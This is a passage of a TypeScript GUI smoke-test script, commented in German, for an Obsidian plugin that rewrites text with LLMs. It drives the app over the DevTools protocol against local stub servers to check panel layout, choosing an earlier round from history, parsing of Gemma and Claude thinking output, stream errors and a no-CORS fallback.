        const opt = [...sel.options].find((o) => (o.textContent || "").includes(${q(APPLE_LABEL)}));
        sel.value = opt.value;
        sel.dispatchEvent(new Event("change", { bubbles: true }));
        return { ok: true };
      })()`)};
    `);
    const gewaehlt = await pollUntil<{ transport: string | null }>(cdp, `
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      const src = await p.llm.resolve();
      return src.transport === "shortcuts" ? { transport: "shortcuts" } : null;
    `, 8000, 250);
    const hinweis = await stelleText(stelle);
    record(NAMEN[2]!, gewaehlt !== null, gewaehlt !== null
      ? `Quelle traegt transport shortcuts; Hinweis zur Grenze im Tab: ${/4096/.test(hinweis) ? "da" : "FEHLT"}`
      : "Quelle blieb HTTP — die Dropdown-Wahl kam nicht an");
    await closeSettings(cdp, stelle);
    stelle = null;

    // S4/S5 — ein Lauf. `window.open`-Stub VOR dem Klick, Rueckbau im finally.
    await cdp.evaluate(`
      window.__smokeOpenUrls = [];
      window.__smokeOrigOpen = window.open;
      window.open = (u) => { window.__smokeOpenUrls.push(String(u)); return null; };
      return { ok: true };
    `);
    stubGesetzt = true;
    await clickReal(cdp, `document.querySelector(".lt-run")`);
    const url = await pollUntil<{ u: string }>(cdp, `const u = window.__smokeOpenUrls[0]; return u ? { u } : null;`, 10_000, 250);
    const dekodiert = url ? decodeURIComponent(url.u) : "";
    const istKurzbefehl = url !== null && url.u.startsWith("shortcuts://") && dekodiert.includes(APPLE_SHORTCUT);
    // Der gefaltete Prompt ist System- plus Nutzertext: deutlich mehr als der Kurzbefehl-Name.
    record(NAMEN[3]!, istKurzbefehl && dekodiert.length > url!.u.indexOf("?") + APPLE_SHORTCUT.length + 40,
      url ? `${url.u.slice(0, 60)}… (${url.u.length} Zeichen), Name ${dekodiert.includes(APPLE_SHORTCUT) ? "da" : "fehlt"}` : "window.open wurde nicht aufgerufen");

    const ende = await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && (s.classList.contains("is-ok") || s.classList.contains("is-error")) ? { ok: true } : null;`, 30_000, 500);
    const meldung = (await text(cdp, ".lt-status-label")) ?? "";
    const istFehler = ende !== null && (await hasClass(cdp, ".lt-status", "is-error"));
    record(NAMEN[4]!, istFehler && /Apple[ -]Intelligence/.test(meldung) && !/\(\d{3}\)/.test(meldung),
      `Status ${istFehler ? "is-error" : "nicht is-error"}, Meldung: ${JSON.stringify(meldung)}`);
  } catch (e) {
    for (const n of NAMEN) {
      if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
    }
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
    if (stubGesetzt) {
      await cdp.evaluate(`window.open = window.__smokeOrigOpen; delete window.__smokeOrigOpen; delete window.__smokeOpenUrls; return { ok: true };`).catch(() => null);
    }
    await removeFakeManager(cdp).catch(() => null);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      if (!p) return { ok: false };
      p.settings.choice = {};
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `).catch(() => null);
    if (fake) await fake.close().catch(() => undefined);
  }
}

/** R1 — die Zeile der aktiven Runde laeuft in der Standardbreite der Sidebar nicht ueber (Welle 9).
 *
 *  Gemessen wird an einem ECHTEN Lauf gegen einen Fake-Server (zwei Runden, die zweite mit langer
 *  Anmerkung), bei ~300 px Sidebar-Breite: kein `.lt-history-row` darf breiter scrollen, als es
 *  ist. Anlass: `rounds.png` fuer die README zeigte den Fehler nur, wenn man ihn ansah — die Zeile
 *  wurde links abgeschnitten, und die Aufnahme haette ihn mit einer breiteren Sidebar versteckt.
 *  Gegenprobe: mit der alten Regel (`white-space: nowrap` vom Button) ist dieser Punkt rot. */
async function pruefeRundenZeile(cdp: Cdp): Promise<void> {
  const name = "R1 Runden-Zeile laeuft bei ~300 px nicht ueber";
  let fake: FakeChatEndpoint | null = null;
  let vorher: { eps: unknown; breite: number } | null = null;
  try {
    fake = await startFakeChatEndpoint("smoke-rounds-model");
    vorher = await cdp.evaluate<{ eps: unknown; breite: number }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints, breite: app.workspace.rightSplit.size ?? 300 };`);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(fake.url)}, model: "smoke-rounds-model" }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      app.workspace.rightSplit.setSize(300);
      return { ok: true };
    `);
    // Quelle Textfeld, damit kein Editor gebraucht wird; Text tippen, damit die Quelle bereit ist.
    await waehleQuelle(cdp, 2);
    await cdp.evaluate(`
      const el = document.querySelector(".lt-freetext");
      el.value = "Could you maybe send the report by Friday?";
      el.dispatchEvent(new Event("input", { bubbles: true }));
      return { ok: true };
    `);
    await setzeNotiz(cdp, "Keep the offer of another day.");
    const ok1 = await laufeTune(cdp);
    await setzeNotiz(cdp, "Keep the offer of another day, and mention the deadline once more.");
    await clickReal(cdp, `document.querySelector(".lt-refine")`);
    const ok2 = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelectorAll(".lt-history-row").length >= 2 && document.querySelector(".lt-status")?.classList.contains("is-ok") ? { ok: true } : null;`, 30_000, 300);
    if (!ok1 || ok2 === null) { nichtGemessen(name, "zwei Runden liessen sich nicht herstellen (Fake-Lauf nicht gruen)"); return; }
    await new Promise((r) => setTimeout(r, 400));
    const m = await cdp.evaluate<{ zeilen: Array<{ scroll: number; client: number; panel: number }> }>(`
      const p = document.querySelector(".lt-panel");
      return { zeilen: [...document.querySelectorAll(".lt-history-row")].map((r) => ({ scroll: r.scrollWidth, client: r.clientWidth, panel: p ? p.clientWidth : 0 })) };
    `);
    const zu = m.zeilen.filter((z) => z.scroll > z.client + 1);
    record(name, m.zeilen.length >= 2 && zu.length === 0,
      zu.length === 0 ? `${m.zeilen.length} Zeilen, scrollWidth <= clientWidth (Panel ${m.zeilen[0]?.panel} px)` : `${zu.length} von ${m.zeilen.length} Zeilen laufen ueber: ${zu.map((z) => `${z.scroll} > ${z.client}`).join(", ")}`);
  } catch (e) {
    nichtGemessen(name, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        p.settings.endpoints = ${JSON.stringify(vorher.eps)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        app.workspace.rightSplit.setSize(${Number(vorher.breite)});
        return { ok: true };
      `).catch(() => null);
    }
    await waehleQuelle(cdp, 1).catch(() => "");
    if (fake) await fake.close().catch(() => undefined);
  }
}

/** R2/R3 — Rückwahl und schmales Panel, an einem echten Lauf gegen den Stub (Restliste der 0.1.x-Nachlese).
 *  R2: Nach zwei Runden waehlt ein Klick auf die erste Zeile der Verlaufsliste die Runde 1 zurueck: die Zeile ist aktiv
 *  (`is-active`, `aria-pressed`) und die Vorschau zeigt wieder DEREN Ergebnis (der Stub nummeriert die Antworten).
 *  R3: Bei ~230 px Sidebar-Breite (unter den 250 px der Restliste) ragt kein Bedienelement ueber den Rand des Panels, und das
 *  Panel scrollt nicht seitwaerts. Die tatsaechliche Breite steht im Detail: Obsidian kann die Sidebar nach unten begrenzen. */
async function pruefeRueckwahl(cdp: Cdp): Promise<void> {
  const R2 = "R2 Rueckwahl: Klick auf die vorletzte Runde zeigt deren Ergebnis, die Zeile ist aktiv";
  const R3 = "R3 Panel ragt bei ~230 px Sidebar-Breite nicht ueber den Rand";
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: { eps: unknown; breite: number } | null = null;
  try {
    stub = await startLlmStub({ models: ["rw-model"], standard: { text: "Antwort-0", model: "rw-model" }, antwort: (_a, n) => ({ text: `Antwort-${n}`, model: "rw-model" }) });
    vorher = await cdp.evaluate<{ eps: unknown; breite: number }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints, breite: app.workspace.rightSplit.size ?? 300 };`);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(stub.url)}, model: "rw-model" }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      app.workspace.rightSplit.setSize(300);
      return { ok: true };
    `);
    await waehleQuelle(cdp, 2);
    await cdp.evaluate(`
      const el = document.querySelector(".lt-freetext");
      el.value = "Could you maybe send the report by Friday?";
      el.dispatchEvent(new Event("input", { bubbles: true }));
      return { ok: true };
    `);
    await setzeNotiz(cdp, "Keep the offer of another day.");
    const ok1 = await laufeTune(cdp);
    await setzeNotiz(cdp, "Keep it short.");
    await clickReal(cdp, `document.querySelector(".lt-refine")`);
    const zwei = await pollUntil<{ ok: boolean }>(cdp, `return document.querySelectorAll(".lt-history-row").length >= 2 && document.querySelector(".lt-status")?.classList.contains("is-ok") ? { ok: true } : null;`, 30_000, 300);
    if (!ok1 || zwei === null) { nichtGemessen(R2, "zwei Runden liessen sich nicht herstellen"); nichtGemessen(R3, "zwei Runden liessen sich nicht herstellen"); return; }
    const zweite = (await text(cdp, ".lt-preview")) ?? "";
    // Die Sitzung traegt Runden frueherer Abschnitte: zurueckgewaehlt wird die vorletzte, also MEINE erste Runde.
    const anzahl = (await cdp.evaluate<{ n: number }>(`return { n: document.querySelectorAll(".lt-history-row").length };`)).n;
    const ziel = anzahl - 2;
    await clickReal(cdp, `document.querySelectorAll(".lt-history-row")[${ziel}]`);
    const zurueck = await pollUntil<{ vorschau: string }>(cdp, `const r = document.querySelectorAll(".lt-history-row")[${ziel}]; const v = document.querySelector(".lt-preview"); return r && r.classList.contains("is-active") && v ? { vorschau: v.textContent.trim() } : null;`, 8000, 250);
    const m = await cdp.evaluate<{ pressed: string[]; vorschau: string }>(`return { pressed: [...document.querySelectorAll(".lt-history-row")].map((r) => r.getAttribute("aria-pressed")), vorschau: (document.querySelector(".lt-preview") || { textContent: "" }).textContent.trim() };`);
    const nurZiel = m.pressed.every((x, i) => (x === "true") === (i === ziel));
    record(R2, zurueck !== null && nurZiel && m.vorschau !== zweite && m.vorschau.includes("Antwort-1") && zweite.includes("Antwort-2"),
      `${anzahl} Runden, Runde ${ziel + 1} zurueckgewaehlt; letzte Runde zeigte ${JSON.stringify(zweite.slice(0, 20))}, nach dem Klick ${JSON.stringify(m.vorschau.slice(0, 20))}, nur Zeile ${ziel + 1} aktiv: ${nurZiel}`);

    await cdp.evaluate(`app.workspace.rightSplit.setSize(230); return { ok: true };`);
    await new Promise((r) => setTimeout(r, 800));
    const b = await cdp.evaluate<{ panel: number; scroll: number; rand: number; raus: string[] }>(`
      const p = document.querySelector(".lt-panel");
      const pr = p.getBoundingClientRect();
      const raus = [...p.querySelectorAll("button, select, textarea, input")]
        .filter((e) => { const r = e.getBoundingClientRect(); return r.width > 0 && (r.right > pr.right + 1 || r.left < pr.left - 1); })
        .map((e) => (e.className || e.tagName) + " " + Math.round(e.getBoundingClientRect().right - pr.right));
      return { panel: Math.round(pr.width), scroll: p.scrollWidth - p.clientWidth, rand: Math.round(pr.right), raus };
    `);
    record(R3, b.panel > 0 && b.panel < 250 + 40 && b.scroll <= 1 && b.raus.length === 0,
      `Panel ${b.panel} px breit, seitwaerts scrollbar um ${b.scroll} px, ueberragende Elemente: ${b.raus.length === 0 ? "keine" : b.raus.join(", ")}`);
  } catch (e) {
    for (const n of [R2, R3]) if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        p.settings.endpoints = ${JSON.stringify(vorher.eps)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        app.workspace.rightSplit.setSize(${Number(vorher.breite)});
        return { ok: true };
      `).catch(() => null);
    }
    await waehleQuelle(cdp, 1).catch(() => "");
    if (stub) await stub.stop();
  }
}

/** T1/T1b — das Gemma-Format (Gemma-Abschluss, Welle 23): gemma-4 auf LM Studio ignoriert „none“ und schreibt sein Denken OHNE
 *  Oeffner in den Inhalt, beendet es mit `<channel|>` (gemessen 2026-10-14). Der Stub spielt das nach.
 *  T1: das Ergebnis ist nur die Antwort. T1b: das Denken landet im ausklappbaren Denkblock statt im Antworttext. Mit dem Stand vor
 *  Kit 0.60.3 (think-splitter ohne Kanalformat, ohne `onContentReset`) ist T1 rot — die Gegenprobe, die nach der Hebung nicht mehr messbar ist. */
async function pruefeGemma(cdp: Cdp): Promise<void> {
  const T1 = "T1 Gemma-Stub: das Denken ohne Oeffner steht nicht im Ergebnis";
  const T1b = "T1b Gemma-Stub: das Denken steht im ausklappbaren Denkblock";
  const MODELL = "google/gemma-4-e4b";
  const DENKEN = "The user wants me to make the mail more polite.\nI will keep the offer of another day.";
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: unknown = null;
  try {
    stub = await startLlmStub({ models: [MODELL], takt: 150, standard: { text: "x", model: MODELL }, antwort: () => ({ text: `${DENKEN}<channel|>Sauberer Text`, laenge: 14, model: MODELL }) });
    vorher = await cdp.evaluate<unknown>(`return app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints;`);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(stub.url)}, model: ${q(MODELL)} }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    await waehleQuelle(cdp, 2);
    await cdp.evaluate(`
      const el = document.querySelector(".lt-freetext");
      el.value = "Could you maybe send the report by Friday?";
      el.dispatchEvent(new Event("input", { bubbles: true }));
      return { ok: true };
    `);
    await setzeNotiz(cdp, "Keep the offer of another day.");
    let imBlock = false;
    const ok = await laufeTune(cdp, async () => {
      const b = await pollUntil<{ ok: boolean }>(cdp, `const pre = document.querySelector(".okit-stream-reasoning pre"); return pre && pre.textContent.includes("The user wants") ? { ok: true } : null;`, 15_000, 100);
      imBlock = b !== null;
    });
    // Ohne den Denkblock: `.lt-preview` enthaelt ihn als Kind, gemessen wird die Antwort.
    const vorschau = (await cdp.evaluate<string>(`const v = document.querySelector(".lt-preview"); if (!v) return ""; const c = v.cloneNode(true); c.querySelectorAll(".okit-stream-reasoning").forEach((e) => e.remove()); return (c.textContent || "").trim();`)).trim();
    const nachLauf = (await cdp.evaluate<{ n: number }>(`const pre = document.querySelector(".okit-stream-reasoning pre"); return { n: pre && pre.textContent.includes("The user wants") ? 1 : 0 };`)).n > 0;
    if (!ok && vorschau === "") { nichtGemessen(T1, "der Lauf wurde nicht gruen"); nichtGemessen(T1b, "der Lauf wurde nicht gruen"); return; }
    await haltePanelBild(cdp, "gemma-denkblock");
    record(T1, vorschau === "Sauberer Text", `Vorschau ${JSON.stringify(vorschau.slice(0, 90))}`);
    record(T1b, imBlock || nachLauf, `Denktext im Denkblock waehrend des Streams: ${imBlock}, nach dem Lauf: ${nachLauf}`);
  } catch (e) {
    for (const n of [T1, T1b]) if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        p.settings.endpoints = ${JSON.stringify(vorher)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        return { ok: true };
      `).catch(() => null);
    }
    await waehleQuelle(cdp, 1).catch(() => "");
    if (stub) await stub.stop();
  }
}

/** CL1–CL3 — Claude (Anthropic API) ueber den LLM Endpoint Manager, Pilot Welle 23 (Kit 0.62.0, Opt-in `transports.anthropic`).
 *  Gegenstelle: der zentrale LLM-Stub im Anthropic-Modus (Messages-API, geprueft: `x-api-key`, `anthropic-version`, Pflichtfelder). Kein
 *  Aufruf an api.anthropic.com. Der Fake-Manager (Bruecke) kennt `transport: "anthropic"` noch nicht im Typ; sein `list()` filtert
 *  aber schon nach `transports` und liefert den Eintrag nur, wenn der Aufrufer es verlangt (Kontrolle in CL1). */
async function pruefeClaude(cdp: Cdp, port: number): Promise<void> {
  const [CL1, CL2, CL3] = [
    "CL1 Fake-Manager mit Anbieter anthropic: der Endpunkt kommt nur mit Opt-in, das Plugin waehlt ihn",
    "CL2 Lauf gegen den Claude-Stub: Messages-API mit Schluessel, Ergebnis im Panel, Denken im Denkblock",
    "CL3 Fehler mitten im Strom: das Panel zeigt is-error mit der Meldung der API, das Teilergebnis bleibt",
  ];
  const MODELL = "claude-haiku-5-5";
  const SCHLUESSEL = "sk-ant-smoke-lingotuner";
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let manager = false;
  let denkenAn = false;
  try {
    stub = await startLlmStub({
      anbieter: "anthropic",
      schluessel: SCHLUESSEL,
      models: [{ id: MODELL, capabilities: { effort: { supported: true }, thinking: { types: { adaptive: { supported: true } } } } }],
      takt: 120,
      standard: { reasoning: "Ich pruefe zuerst, welche Anmerkung gilt. ", text: "Claude-Antwort in zwei Absaetzen.\n\nZweiter Absatz.", laenge: 12, model: MODELL },
    });
    await removeFakeManager(cdp);
    await installZentralFakeManager(cdp, {
      pluginId: MANAGER_PLUGIN_ID,
      endpunkte: [{
        id: "fake-claude", label: "Claude API", url: stub.url, models: [MODELL], defaultModel: MODELL, configModel: "default",
        provider: "anthropic", backend: "anthropic", apiKey: SCHLUESSEL, hasSecret: true,
        // Typ der Bruecke kennt nur http|shortcuts; die Laufzeit reicht den Wert durch (Befund an den Master).
        transport: "anthropic" as unknown as "http",
      }],
      invalidiere: [PLUGIN_ID],
    });
    manager = true;
    const sicht = await cdp.evaluate<{ ohne: number; mit: number; quelle: string; modell: string; transport: string | null; backend: string }>(`
      const api = app.plugins.plugins[${q(MANAGER_PLUGIN_ID)}].api;
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.llm.invalidate();
      const r = await p.llm.resolve({ force: true });
      const src = p.llm.source();
      return {
        ohne: api.list({ capability: "chat" }).length,
        mit: api.list({ capability: "chat", transports: ["http", "anthropic"] }).length,
        quelle: src.backendSource, modell: src.model, transport: src.family, backend: src.backend,
      };
    `);
    record(CL1, sicht.ohne === 0 && sicht.mit === 1 && sicht.quelle === "manager" && sicht.modell === MODELL && sicht.backend === "anthropic" && sicht.transport === "claude",
      `Kontrolle am Fake: list() ohne transports ${sicht.ohne}, mit ["http","anthropic"] ${sicht.mit}; Plugin: Backend ${sicht.backend} (Quelle ${sicht.quelle}), Familie ${sicht.transport}, Modell ${sicht.modell}`);

    await halteEinstellungenBild(cdp, port, "claude-einstellungen");

    // CL2 — ein Lauf mit Denken
    await schalteDenkenAn(cdp);
    denkenAn = true;
    await cdp.evaluate(`app.workspace.trigger("active-leaf-change"); return { ok: true };`);
    await waehleQuelle(cdp, 2);
    await cdp.evaluate(`
      const el = document.querySelector(".lt-freetext");
      el.value = "Could you maybe send the report by Friday?";
      el.dispatchEvent(new Event("input", { bubbles: true }));
      return { ok: true };
    `);
    await setzeNotiz(cdp, "Keep it short.");
    let imBlock = false;
    const ok = await laufeTune(cdp, async () => {
      const b = await pollUntil<{ ok: boolean }>(cdp, `const pre = document.querySelector(".okit-stream-reasoning pre"); return pre && pre.textContent.includes("welche Anmerkung") ? { ok: true } : null;`, 15_000, 100);
      imBlock = b !== null;
    });
    const vorschau = (await cdp.evaluate<string>(`const v = document.querySelector(".lt-preview"); if (!v) return ""; const c = v.cloneNode(true); c.querySelectorAll(".okit-stream-reasoning").forEach((e) => e.remove()); return (c.textContent || "").trim();`)).trim();
    await haltePanelBild(cdp, "claude-denkblock");
    const anfragen = stub.anfragen().filter((a) => a.route === "messages");
    const letzte = anfragen.at(-1);
    const body = (letzte?.json ?? {}) as Record<string, unknown>;
    const verbotene = ["temperature", "top_p", "top_k", "min_p", "presence_penalty"].filter((k) => k in body);
    const kopf = letzte?.header ?? {};
    const protokollOk = anfragen.length > 0 && kopf["x-api-key"] === SCHLUESSEL && typeof kopf["anthropic-version"] === "string"
      && typeof body.max_tokens === "number" && body.stream === true && verbotene.length === 0
      && kopf["anthropic-dangerous-direct-browser-access"] === "true";
    record(CL2, ok && vorschau.startsWith("Claude-Antwort") && imBlock && protokollOk,
      `Lauf ${ok ? "gruen" : "nicht gruen"}, Vorschau ${JSON.stringify(vorschau.slice(0, 40))}, Denkblock waehrend des Streams: ${imBlock}; Anfragen ${anfragen.length}, x-api-key ${kopf["x-api-key"] === SCHLUESSEL ? "ok" : "FALSCH"}, anthropic-version ${String(kopf["anthropic-version"])}, Browser-Header ${String(kopf["anthropic-dangerous-direct-browser-access"])}, max_tokens ${String(body.max_tokens)}, stream ${String(body.stream)}, verbotene Felder: ${verbotene.length === 0 ? "keine" : verbotene.join(",")}`);

    // CL3 — Fehler mitten im Strom
    stub.antworten([{ text: "Teilantwort vor dem Fehler und mehr Text. ".repeat(3), laenge: 12, model: MODELL, stromFehler: { nach: 3, typ: "overloaded_error", meldung: "Overloaded" } }]);
    await setzeNotiz(cdp, "Keep it short, again.");
    await clickReal(cdp, `document.querySelector(".lt-run")`);
    const fertig = await pollUntil<{ ok: boolean }>(cdp, `const s = document.querySelector(".lt-status"); return s && (s.classList.contains("is-ok") || s.classList.contains("is-error")) ? { ok: true } : null;`, 30_000, 300);
    const fehler = await hasClass(cdp, ".lt-status", "is-error");
    const label = (await text(cdp, ".lt-status-label")) ?? "";
    const teil = (await cdp.evaluate<string>(`return (document.querySelector(".lt-preview")?.textContent || "").trim();`));
    record(CL3, fertig !== null && fehler && /overload/i.test(label) && teil.includes("Teilantwort"),
      `Status ${fertig === null ? "nie fertig" : fehler ? "is-error" : "is-ok"}, Meldung ${JSON.stringify(label.slice(0, 80))}, Vorschau beginnt ${JSON.stringify(teil.slice(0, 30))}`);
  } catch (e) {
    for (const n of [CL1, CL2, CL3]) if (!aufgezeichnet(n)) nichtGemessen(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (denkenAn) await stelleDenkenZurueck(cdp).catch(() => null);
    if (manager) await removeFakeManager(cdp).catch(() => null);
    await cdp.evaluate(`const p = app.plugins.plugins[${q(PLUGIN_ID)}]; p.llm.invalidate(); return true;`).catch(() => null);
    await waehleQuelle(cdp, 1).catch(() => "");
    if (stub) await stub.stop();
  }
}

/** Optional: mit `SHOT_DIR=<ordner>` nimmt der Lauf das Panel nach T1 (Gemma) und CL2 (Claude) auf (Sichtpruefung des Denkblocks, Regel 12).
 *  Aufnahmen gehoeren unter `--exclusive focus`: unter einem Port-Lock haengt `Page.captureScreenshot` bei verdecktem Fenster. */
async function haltePanelBild(cdp: Cdp, name: string): Promise<void> {
  const dir = process.env.SHOT_DIR;
  if (dir === undefined || dir === "") return;
  try {
    mkdirSync(dir, { recursive: true });
    await cdp.evaluate(`const d = document.querySelector(".okit-stream-reasoning"); if (d) d.open = true; return true;`);
    const r = await boxAround(cdp, [".lt-panel"], 4);
    const png = await capture(cdp, r ?? undefined, 1, {});
    writeFileSync(join(dir, `${name}.png`), png);
    console.log(`  · Bild: ${join(dir, `${name}.png`)}`);
  } catch (e) {
    console.log(`  · Bild ${name} nicht aufgenommen: ${(e as Error).message}`);
  }
}

/** Optional (`SHOT_DIR`): die Einstellungen mit aufgeklapptem Abschnitt „Anfrage“ aufnehmen (Claude-Endpunkt in der Auswahl, Familie und Backend im Kopf). */
async function halteEinstellungenBild(cdp: Cdp, port: number, name: string): Promise<void> {
  const dir = process.env.SHOT_DIR;
  if (dir === undefined || dir === "") return;
  let stelle: SettingsStelle | null = null;
  try {
    mkdirSync(dir, { recursive: true });
    stelle = await openSettings(cdp, port);
    await stelle.cdp.evaluate(`return ${stelle.el(`(() => {
      const header = [...root.querySelectorAll(".okit-collapsible-header")].find((h) => /Anfrage|Request/.test(h.textContent || ""));
      if (header && header.closest(".okit-collapsible").querySelector(".okit-collapsible-body.is-collapsed")) header.click();
      return true;
    })()`)};`);
    await new Promise((r) => setTimeout(r, 500));
    await stelle.cdp.evaluate(`return ${stelle.el(`(() => { const t = root.querySelector(".okit-collapsible-header"); if (t) t.scrollIntoView({ block: "start" }); return true; })()`)};`);
    await new Promise((r) => setTimeout(r, 400));
    const png = await capture(stelle.cdp, undefined, 1, {});
    writeFileSync(join(dir, `${name}.png`), png);
    console.log(`  · Bild: ${join(dir, `${name}.png`)}`);
  } catch (e) {
    console.log(`  · Bild ${name} nicht aufgenommen: ${(e as Error).message}`);
  } finally {
    if (stelle) await closeSettings(cdp, stelle);
  }
}

async function setzeNotiz(cdp: Cdp, text: string): Promise<void> {
  await cdp.evaluate(`
    const el = document.querySelector(".lt-note");
    el.value = ${q(text)};
    el.dispatchEvent(new Event("input", { bubbles: true }));
    return { ok: true };
  `);
}

/** N1-N4 (Sampling-Profile-Welle, Teil D, Rezept 8): der neue Abschnitt „Anfrage" in den
 *  Settings und die Denk-Steuerung im Panel (`buildThinkingControl`). Kein echter LLM-Server
 *  noetig — alles hier ist DOM-Zustand nach einer Einstellungs-Aenderung. */
/** L — llm-lab bekommt Aufzeichnungen. Der Punkt, den der Smoke bis 2026-09-25 nicht hatte: der Client
 *  pruefte apiVersion 3, das Lab lieferte 4, `readLabApi` gab still null zurueck und NICHTS wurde
 *  aufgezeichnet — kein Fehler, kein rotes Zeichen. Gemessen wird deshalb die Wirkung: eine neue
 *  Zeile in der Trace-Datei des Labs, mit turnId. Ohne geladenes llm-lab: uebersprungen und benannt. */
async function pruefeLab(cdp: Cdp): Promise<void> {
  console.log("\nL · llm-lab-Aufzeichnung (optionale Fremd-Quelle)");
  const NAME = "L1 Ein Tunen erzeugt eine Lab-Aufzeichnung mit turnId (apiVersion 4)";
  const info = await cdp.evaluate<{ da: boolean; version: number | null }>(`const l = app.plugins.plugins[${q(LAB_PLUGIN_ID)}]; return { da: !!l?.api, version: l?.api?.apiVersion ?? null };`);
  if (!info.da) { nichtGemessen(NAME, `llm-lab nicht geladen — 'npm run smoke:gui -- --setup' deployt es aus ../llm-lab (gebaut), danach die Zweitinstanz neu starten`); return; }
  let fake: FakeChatEndpoint | null = null;
  const zeilen = `
    const dir = ".obsidian/plugins/${LAB_PLUGIN_ID}/traces";
    const out = [];
    if (await app.vault.adapter.exists(dir)) {
      for (const f of (await app.vault.adapter.list(dir)).files) {
        for (const z of (await app.vault.adapter.read(f)).split("\\n")) { if (!z) continue; try { const r = JSON.parse(z); if (r.plugin === "lingotuner") out.push(r); } catch { /* halbe Zeile */ } }
      }
    }
    return { zeilen: out };`;
  try {
    fake = await startFakeChatEndpoint(MANAGER_DEFAULT_MODEL);
    await installFakeManager(cdp, fake.url);
    const vorher = (await cdp.evaluate<{ zeilen: unknown[] }>(zeilen)).zeilen.length;
    const ok = await laufeTune(cdp);
    const nach = await pollUntil<{ zeilen: Array<{ turnId?: string }> }>(cdp, zeilen.replace("return { zeilen: out };", `return out.length > ${vorher} ? { zeilen: out } : null;`), 5000, 250);
    const letzte = nach?.zeilen[nach.zeilen.length - 1];
    record(NAME, ok && nach !== null && typeof letzte?.turnId === "string" && letzte.turnId.length > 0,
      ok ? `Lab apiVersion ${String(info.version)}, Zeilen von lingotuner ${vorher} → ${nach?.zeilen.length ?? vorher}, turnId ${JSON.stringify(letzte?.turnId ?? null)}`
         : `Lauf lieferte kein Ergebnis (Status: ${(await text(cdp, ".lt-status")) ?? "?"})`);
  } finally {
    await removeFakeManager(cdp).catch(() => null);
    if (fake) await fake.close();
  }
}

/** F — Origin-Weigerung: der Chat-Client (Kit 0.43.0) wiederholt einmal ohne Stream ueber `requestUrl`.
 *  Der Fake-Server sendet KEINE CORS-Header: der XHR-Preflight aus `app://obsidian.md` scheitert, waehrend
 *  `requestUrl` (Hauptprozess, ohne Origin) durchkommt — genau die Lage „Probe gruen, Chat rot". Gemessen
 *  wird die Wirkung: ein Ergebnis kommt an, und der POST, den der Server sah, trug `stream:false`. */
async function pruefeFallback(cdp: Cdp): Promise<void> {
  console.log("\nF · Origin-Weigerung → Anfrage ohne Stream");
  const NAME = "F1 Ohne CORS-Freigabe kommt das Ergebnis ueber den Fallback ohne Stream";
  // Bewusst ohne CORS (`cors: false`): der Preflight ist 404, der XHR des Renderers scheitert, `requestUrl` nicht.
  const stub = await startLlmStub({ cors: false, models: ["fb-model"], standard: { text: "fallback ok", model: "fb-model" } });
  const url = stub.url;
  let vorher: unknown = null;
  try {
    vorher = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${q(PLUGIN_ID)}].settings.endpoints };`)).eps;
    await cdp.evaluate(`
      const p = app.plugins.plugins[${q(PLUGIN_ID)}];
      p.settings.endpoints = [{ url: ${q(url)}, model: "fb-model" }];
      await p.saveSettings();
      p.llm.invalidate();
      await p.llm.resolve();
      return { ok: true };
    `);
    const ok = await laufeTune(cdp);
    const ergebnis = ok ? await text(cdp, ".okit-stream-body") : null;
    const posts = stub.zaehler().chat;
    const streamFlag: unknown = posts === 0 ? "nie gesehen" : (stub.letzte("chat")?.json as { stream?: unknown } | null)?.stream ?? "kein JSON";
    record(NAME, ok && posts === 1 && streamFlag === false,
      `Lauf ${ok ? "ok" : `fehlgeschlagen (${(await text(cdp, ".lt-status")) ?? "?"})`}, POST ohne Preflight-Freigabe: ${posts}, stream im Body: ${JSON.stringify(streamFlag)}, Ergebnis ${JSON.stringify(ergebnis?.slice(0, 40) ?? null)}`);
  } finally {
    if (vorher !== null) {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${q(PLUGIN_ID)}];
        if (!p) return { ok: false };
        p.settings.endpoints = ${JSON.stringify(vorher)};
        await p.saveSettings();
        p.llm.invalidate();
        await p.llm.resolve();
        return { ok: true };
      `).catch(() => null);
    }
    await stub.stop();
  }
}

